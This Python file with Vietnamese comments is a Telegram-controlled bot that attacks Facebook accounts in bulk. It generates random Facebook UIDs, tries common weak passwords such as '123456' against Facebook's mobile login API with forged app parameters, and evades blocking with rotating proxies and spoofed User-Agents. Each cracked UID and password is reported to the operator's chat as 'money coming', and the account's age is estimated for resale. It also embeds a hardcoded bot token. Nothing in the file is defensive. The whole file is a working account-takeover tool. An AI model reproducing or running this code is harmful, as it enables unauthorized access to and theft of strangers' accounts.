import os
import asyncio
import random
import uuid
import requests
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.constants import ParseMode

# ---------- Cấu hình ----------
TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8377931268:AAGkN2B6OVjamYf7kskT0wgoM9S2Hp9waUQ")

# ---------- Biến toàn cục ----------
loop_count = 0
oks = []
stop_flag = False
scan_task = None
proxy_pool = []          # danh sách proxy sống
proxy_lock = asyncio.Lock()  # tránh đọc/ghi đồng thời

# ---------- Hàm kiểm tra proxy (có timeout) ----------
def check_proxy(proxy_str):
    try:
        proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}",
        }
        r = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
        return r.status_code == 200
    except:
        return False

async def load_live_proxies():
    """Đọc proxy.txt, kiểm tra và cập nhật proxy_pool (chỉ gọi 1 lần khi cần)."""
    global proxy_pool
    async with proxy_lock:
        if not os.path.exists("proxy.txt"):
            proxy_pool = []
            return 0

        with open("proxy.txt", "r") as f:
            raw = [line.strip() for line in f if line.strip()]

        if not raw:
            proxy_pool = []
            return 0

        # Kiểm tra đồng thời bằng ThreadPoolExecutor
        loop = asyncio.get_running_loop()
        with ThreadPoolExecutor(max_workers=20) as pool:
            results = await asyncio.gather(
                *[loop.run_in_executor(pool, check_proxy, p) for p in raw]
            )

        live = [raw[i] for i, ok in enumerate(results) if ok]
        proxy_pool = live
        return len(live)

# ---------- Hàm login (method A) ----------
def window1():
    """Random User‑Agent giả Windows."""
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = random.randint(6000, 9000)
    latest_patch = random.randint(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

def creationyear(uid):
    """Đoán năm tạo Facebook từ UID."""
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def attempt_login(uid, proxy_str=None):
    """Thử đăng nhập method A, timeout 10s."""
    global loop_count, oks
    session = requests.Session()
    if proxy_str:
        session.proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}",
        }
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data,
                headers=headers,
                allow_redirects=False,
                timeout=10      # <-- THÊM TIMEOUT
            ).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                year = creationyear(uid)
                loop_count += 1
                oks.append(uid)
                return (uid, pw, year)
        loop_count += 1
    except Exception as e:
        loop_count += 1
    return None

# ---------- Vòng quét vô hạn (nền) ----------
async def scan_loop_wrapper(chat_id, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, loop_count, oks, proxy_pool
    executor = ThreadPoolExecutor(max_workers=100)
    batch_size = 100   # tạm giảm để test, sau tăng lên 1000
    star = '10000'

    # Chỉ load proxy nếu chưa có
    if not proxy_pool:
        count = await load_live_proxies()
        if count == 0:
            await context.bot.send_message(chat_id, "⚠️ Không có proxy sống, chạy không proxy.")
        else:
            await context.bot.send_message(chat_id, f"🔄 Đã nạp {count} proxy sống.")
    else:
        await context.bot.send_message(chat_id, f"🔄 Sử dụng {len(proxy_pool)} proxy có sẵn.")

    await context.bot.send_message(chat_id, "🚀 Bắt đầu quét...")

    while not stop_flag:
        # Tạo batch UID
        ids = []
        for _ in range(batch_size):
            suffix = str(random.randint(1000000000, 1999999999))
            uid = star + suffix
            ids.append(uid)

        # Log debug mỗi batch
        await context.bot.send_message(
            chat_id,
            f"🔍 Đang quét batch ({len(ids)} UID)... loop={loop_count}",
            disable_notification=True
        )

        # Lấy proxy ngẫu nhiên cho mỗi UID
        loop = asyncio.get_running_loop()
        tasks = []
        for uid in ids:
            proxy = random.choice(proxy_pool) if proxy_pool else None
            tasks.append(loop.run_in_executor(executor, attempt_login, uid, proxy))

        results = await asyncio.gather(*tasks)

        for res in results:
            if res:
                uid, pw, year = res
                msg = (
                    f"> Tiền về sếp ơi\n"
                    f"> Via: {year}\n"
                    f"> UID: `{uid}`\n"
                    f"> Pass: `{pw}`\n"
                    f"> Chi tiết: https://facebook.com/{uid}"
                )
                await context.bot.send_message(chat_id, msg, parse_mode=ParseMode.MARKDOWN_V2)

        await asyncio.sleep(0.5)

    executor.shutdown(wait=False)
    await context.bot.send_message(chat_id, "⏹️ Đã dừng quét.")

# ---------- Lệnh Telegram ----------
async def start_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, scan_task
    chat_id = update.effective_chat.id
    if scan_task and not scan_task.done():
        await update.message.reply_text("⚠️ Bot đang quét rồi.")
        return

    stop_flag = False
    application = context.application
    scan_task = application.create_task(scan_loop_wrapper(chat_id, context))
    await update.message.reply_text("✅ Lệnh /scan đã nhận, bot sẽ sớm bắt đầu...")

async def stop_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, scan_task
    stop_flag = True
    if scan_task:
        scan_task.cancel()
        scan_task = None
    await update.message.reply_text("🛑 Đã yêu cầu dừng.")

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global loop_count, oks, proxy_pool
    msg = (
        f"> 📊 Đã quét: {loop_count} UID\n"
        f"> ✅ Tài khoản OK: {len(oks)}\n"
        f"> 🌐 Proxy sống hiện có: {len(proxy_pool)}"
    )
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)

async def ipprx_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔎 Đang kiểm tra proxy... Vui lòng đợi.")
    count = await load_live_proxies()
    if count == 0:
        await update.message.reply_text("⚠️ Không có proxy sống.")
        return

    with open("live_proxies.txt", "w") as f:
        for p in proxy_pool:
            f.write(p + "\n")

    with open("live_proxies.txt", "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename="live_proxies.txt",
            caption=f"🌐 {count} proxy sống."
        )

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "📋 *Danh sách lệnh*\n"
        "> /scan \\- Bắt đầu quét vô hạn\n"
        "> /stop \\- Dừng quét\n"
        "> /status \\- Xem tiến độ\n"
        "> /ipprx \\- Lọc và gửi file proxy sống\n"
        "> /help \\- Hiển thị trợ giúp này"
    )
    await update.message.reply_text(help_text, parse_mode=ParseMode.MARKDOWN_V2)

# ---------- Khởi tạo proxy khi bot start ----------
async def on_startup(app):
    # Load proxy ngay khi bot khởi động (nếu cần)
    global proxy_pool
    if os.path.exists("proxy.txt"):
        await load_live_proxies()
        print(f"Đã nạp {len(proxy_pool)} proxy sống.")
    else:
        print("Không tìm thấy proxy.txt")

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("scan", start_scan))
    app.add_handler(CommandHandler("stop", stop_scan))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("ipprx", ipprx_cmd))
    app.add_handler(CommandHandler("help", help_cmd))

    # Chạy on_startup sau khi app được tạo
    app.job_queue.run_once(lambda ctx: asyncio.create_task(on_startup(app)), when=0)
    # Hoặc dùng app.post_init = on_startup (nếu dùng PTB>=20.0)
    print("🤖 Bot đã khởi động...")
    app.run_polling()

if __name__ == "__main__":
    main()
